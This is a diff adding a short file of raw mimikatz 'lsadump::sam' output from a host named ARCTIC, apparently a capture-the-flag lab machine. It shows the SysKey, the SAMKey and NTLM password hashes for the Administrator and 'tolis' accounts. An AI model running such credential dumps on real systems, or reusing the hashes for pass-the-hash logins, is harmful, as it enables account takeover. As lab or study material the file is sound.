@@ -1,0 +1,17 @@
+mimikatz # lsadump::sam
+Domain : ARCTIC
+SysKey : 4975066a239a6b023ee486b71cd2dca2
+Local SID : S-1-5-21-2913191377-1678605233-910955532
+
+SAMKey : ed455b0d77c2ef63980eca0351a7c2cf
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 43b2102d6ea725605566f689ce6bb604
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000003e8 (1000)
+User : tolis
+  Hash NTLM: 40ad7d34f236c2624bc826f671998a19
